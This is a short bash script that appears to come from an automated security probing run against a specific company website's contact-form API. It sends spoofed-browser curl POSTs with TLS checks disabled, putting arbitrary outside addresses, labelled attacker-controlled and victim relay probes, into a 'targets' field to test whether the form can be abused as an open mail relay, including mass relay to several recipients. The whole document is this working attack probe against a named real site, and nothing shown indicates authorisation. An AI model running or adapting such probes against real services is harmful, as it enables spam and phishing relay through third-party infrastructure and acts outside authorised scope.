#!/bin/bash
cd $WORK_PATH/tool_outputs
B="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
send() {
  curl -sk -X POST "$B/api/send" -A "$UA" -H "Accept: application/json" -H "Origin: https://www.infinitycapital.bh" \
   -F "fname=IC" -F "lname=Tester" -F "areacode=973" -F "tel=00000000" -F "cname=Example" \
   -F "subject=General" -F "msg=probe" -F "check=1" -F "targets=$1" -w "\nHTTP=%{http_code}\n"
}
echo "### T1: targets = attacker-controlled external address"
send "attacker-control-probe@example.invalid"
echo
echo "### T2: targets = second arbitrary victim (relay proof)"
send "victim-relay-probe@proton.me"
echo
echo "### T3: targets with Name <addr> form (Resend allows)"
send "Probe <relay2@proton.me>"
echo
echo "### T4: multiple recipients (mass relay)"
send "a@proton.me,b@proton.me,c@proton.me"
